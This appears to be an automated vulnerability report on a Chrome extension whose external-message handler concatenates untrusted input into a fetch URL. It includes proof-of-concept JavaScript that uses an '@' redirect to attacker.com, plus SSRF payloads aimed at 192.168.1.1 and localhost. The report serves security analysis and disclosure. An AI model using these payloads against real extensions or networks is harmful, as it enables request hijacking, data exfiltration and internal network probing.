# CoCo Analysis: kjoaoapokmgpopfmmjacbflhbllgmple

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kjoaoapokmgpopfmmjacbflhbllgmple/opgen_generated_files/bg.js
- Line 997: preloadImgs(request.files);
- Line 977: imgs = JSON.parse(imgs);
- Line 979: if (imgs[key].indexOf('themes_pic_file') > 0) {
- Line 980: img_files.push('https://youtube-skins.com' + imgs[key]);

**Code:**

```javascript
// Background script

function httpPreload(img_url) {
    rawResponse = fetch(img_url, {method: 'get'}); // ← fetch sink
    if (img_files.length > 0) {
        httpPreload(img_files.shift());
    }
}

function preloadImgs(imgs) {
    imgs = JSON.parse(imgs); // ← attacker-controlled JSON
    for (var key in imgs) {
        if (imgs[key].indexOf('themes_pic_file') > 0) {
            // ← attacker controls imgs[key]
            img_files.push('https://youtube-skins.com' + imgs[key]);
            // ← vulnerable string concatenation
        }
    }
    if (img_files.length > 0) {
        httpPreload(img_files.shift()); // ← triggers fetch
    }
}

chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        if (request.action == 'install') {
            chrome.storage.local.get('skins').then(function (e) {
                delete request.action;
                skins = [];
                if (e.skins !== undefined)
                    skins = e.skins;
                preloadImgs(request.files); // ← attacker-controlled data
                skins.unshift(request);
                chrome.storage.local.set({
                    skins: skins
                });
            });
        }
        // ... more code
    }
);
```

**Manifest permissions:**
```json
{
  "externally_connectable": {
    "matches": ["*://*.youtube-skins.com/*"]
  },
  "host_permissions": [
    "*://*.youtube.com/*",
    "*://*.youtube-skins.com/*"
  ],
  "permissions": ["storage", "tabs", "activeTab", "scripting"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from youtube-skins.com domain

**Attack:**

```javascript
// Malicious code on https://evil.youtube-skins.com/attack.html
// or https://youtube-skins.com/compromised-page.html

const extensionId = 'kjoaoapokmgpopfmmjacbflhbllgmple';

// Exploit using URL credentials syntax (@) to redirect fetch
const maliciousPayload = {
    action: 'install',
    files: JSON.stringify({
        '0': '@attacker.com/exfiltrate?data=themes_pic_file'
        // The full URL becomes: https://youtube-skins.com@attacker.com/exfiltrate?data=themes_pic_file
        // Per URL spec, this redirects to attacker.com with youtube-skins.com as username
    })
};

chrome.runtime.sendMessage(extensionId, maliciousPayload, function(response) {
    console.log('Extension will now fetch from attacker.com with privileged context');
});
```

**Alternative attack - SSRF to internal network:**

```javascript
// Target internal resources
const ssrfPayload = {
    action: 'install',
    files: JSON.stringify({
        '0': '@192.168.1.1/admin?themes_pic_file=1',
        '1': '@localhost:8080/internal-api?themes_pic_file=true'
    })
};

chrome.runtime.sendMessage(extensionId, ssrfPayload);
// Extension will make privileged requests to:
// - https://192.168.1.1/admin?themes_pic_file=1
// - https://localhost:8080/internal-api?themes_pic_file=true
```

**Impact:**

An attacker controlling any page on `*.youtube-skins.com` can exploit this vulnerability to:

1. **Server-Side Request Forgery (SSRF)**: Make the extension perform privileged fetch requests to arbitrary domains, including internal network resources (localhost, 192.168.x.x, etc.) that are normally inaccessible from regular web pages
2. **Bypass CORS**: Make cross-origin requests with the extension's privileged context, bypassing Same-Origin Policy
3. **Data exfiltration**: Redirect fetch requests to attacker-controlled servers to exfiltrate extension data or user information
4. **Network scanning**: Probe internal networks by making requests to various internal IPs/ports

The vulnerability exists because the code naively concatenates a hardcoded domain with attacker-controlled data without proper URL validation, allowing the @ character to redirect the request to an arbitrary domain per URL specification.
